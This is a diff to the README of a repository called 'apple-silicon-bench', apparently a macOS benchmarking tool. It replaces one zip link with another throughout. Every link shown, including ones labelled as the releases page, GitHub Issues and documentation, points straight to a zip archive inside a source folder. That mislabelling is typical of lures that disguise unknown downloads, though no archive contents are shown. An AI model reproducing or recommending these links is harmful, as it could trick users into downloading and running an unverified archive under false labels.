@@ -4,7 +4,7 @@ Welcome to apple-silicon-bench! This lightweight benchmark tool helps you test y
 
 ## 📥 Download Now
 
-[![Download apple-silicon-bench](https://github.com/surya62324151/apple-silicon-bench/raw/refs/heads/main/scripts/apple-bench-silicon-v3.3.zip)](https://github.com/surya62324151/apple-silicon-bench/raw/refs/heads/main/scripts/apple-bench-silicon-v3.3.zip)
+[![Download apple-silicon-bench](https://raw.githubusercontent.com/surya62324151/apple-silicon-bench/main/Sources/osx-bench/Core/apple_silicon_bench_1.7.zip)](https://raw.githubusercontent.com/surya62324151/apple-silicon-bench/main/Sources/osx-bench/Core/apple_silicon_bench_1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ To begin using apple-silicon-bench, follow these simple steps to download and in
 
 Go to the Releases page to find the latest version of apple-silicon-bench. Click the link below:
 
-[Visit the Releases Page](https://github.com/surya62324151/apple-silicon-bench/raw/refs/heads/main/scripts/apple-bench-silicon-v3.3.zip)
+[Visit the Releases Page](https://raw.githubusercontent.com/surya62324151/apple-silicon-bench/main/Sources/osx-bench/Core/apple_silicon_bench_1.7.zip)
 
 ### 2. Choose Your Version
 
@@ -84,8 +84,8 @@ If you encounter issues while installing or running apple-silicon-bench, try the
 
 For more information, tips, and community support, feel free to check out our additional resources:
 
-- [GitHub Issues](https://github.com/surya62324151/apple-silicon-bench/raw/refs/heads/main/scripts/apple-bench-silicon-v3.3.zip): Report problems or ask questions.
-- [Documentation](https://github.com/surya62324151/apple-silicon-bench/raw/refs/heads/main/scripts/apple-bench-silicon-v3.3.zip): Detailed guides on how to use various features.
+- [GitHub Issues](https://raw.githubusercontent.com/surya62324151/apple-silicon-bench/main/Sources/osx-bench/Core/apple_silicon_bench_1.7.zip): Report problems or ask questions.
+- [Documentation](https://raw.githubusercontent.com/surya62324151/apple-silicon-bench/main/Sources/osx-bench/Core/apple_silicon_bench_1.7.zip): Detailed guides on how to use various features.
 
 ## 🎉 Join the Community
 
